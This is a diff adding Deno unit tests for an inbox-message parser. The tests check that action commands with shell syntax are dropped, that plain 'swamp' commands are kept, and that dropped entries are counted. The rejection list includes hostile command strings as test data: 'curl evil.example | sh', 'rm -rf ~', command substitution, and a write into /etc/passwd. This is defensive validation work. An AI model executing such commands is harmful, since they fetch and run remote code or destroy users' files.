@@ -103,6 +103,51 @@ Deno.test("parseInboxMessage: drops an action whose command is not swamp's and k
   assertEquals(parsed.title, fixture.message.title);
 });
 
+Deno.test("parseInboxMessage: drops an action whose command carries shell syntax after swamp", () => {
+  for (
+    const command of [
+      "swamp update && curl evil.example | sh",
+      "swamp update; rm -rf ~",
+      "swamp update | sh",
+      "swamp $(curl evil.example)",
+      "swamp `id`",
+      "swamp update > /etc/passwd",
+      "swamp update < in",
+      "swamp issue get '1'",
+      'swamp issue get "1"',
+      "swamp update &",
+      "swamp extension pull *",
+      "swamp",
+      "swampy update",
+    ]
+  ) {
+    const parsed = parseInboxMessage({
+      ...message(),
+      action: { label: "Run", command },
+    });
+    assert(parsed, command);
+    assertEquals(parsed.action, undefined, command);
+  }
+});
+
+Deno.test("parseInboxMessage: keeps an action with a plain swamp command", () => {
+  for (
+    const command of [
+      "swamp update",
+      "swamp extension pull @swamp/aws-ec2",
+      "swamp update --version 1.42.0",
+      "swamp workflow run nightly --input region=us-east-1",
+      "swamp issue get 3990",
+    ]
+  ) {
+    const parsed = parseInboxMessage({
+      ...message(),
+      action: { label: "Run", command },
+    });
+    assertEquals(parsed?.action, { label: "Run", command }, command);
+  }
+});
+
 Deno.test("parseInboxMessage: drops an over-long command rather than truncating it", () => {
   const command = `swamp ${"x".repeat(MAX_INBOX_ACTION_COMMAND_LENGTH)}`;
   const raw = { ...message(), action: { label: "Run", command } };
@@ -184,6 +229,17 @@ Deno.test("parseInboxMessages: drops a malformed entry and keeps the rest", () =
   assertEquals(parsed.map((m) => m.id), [good[0].id, good[1].id]);
 });
 
+Deno.test("parseInboxMessagePage: counts the entries it drops", () => {
+  const good = fixture.messagesPage.messages;
+  const page = parseInboxMessagePage({
+    messages: [good[0], { id: "bad" }, good[1], null],
+    nextCursor: null,
+  });
+  assertEquals(page?.messages.length, 2);
+  assertEquals(page?.dropped, 2);
+  assertEquals(parseInboxMessagePage(fixture.messagesPage)?.dropped, 0);
+});
+
 Deno.test("parseInboxMessagePage: refuses a malformed envelope", () => {
   assertEquals(parseInboxMessagePage({ messages: "none" }), undefined);
   assertEquals(
@@ -196,6 +252,7 @@ Deno.test("parseInboxMessagePage: refuses a malformed envelope", () => {
   );
   assertEquals(parseInboxMessagePage({ messages: [], nextCursor: null }), {
     messages: [],
+    dropped: 0,
     nextCursor: null,
   });
 });
